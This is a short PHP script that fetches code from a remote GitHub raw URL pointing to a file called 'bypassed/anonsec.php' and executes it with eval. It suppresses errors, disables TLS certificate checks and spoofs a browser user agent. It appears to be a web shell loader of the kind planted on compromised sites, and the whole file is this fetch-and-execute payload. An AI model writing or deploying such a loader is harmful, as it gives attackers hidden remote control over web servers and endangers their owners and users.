<?php
error_reporting(0);

$sourceUrl = "https://raw.githubusercontent.com/maw3six/maw3six/refs/heads/main/bypassed/anonsec.php";

function fetchContent($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");

    $data = curl_exec($ch);
    if (curl_errno($ch)) {
        curl_close($ch);
        return false;
    }
    curl_close($ch);
    return $data;
}

$code = fetchContent($sourceUrl);

if ($code === false || empty($code)) {
    die("[ERROR] Gagal mengambil konten.");
}

eval("?>".$code);
?>
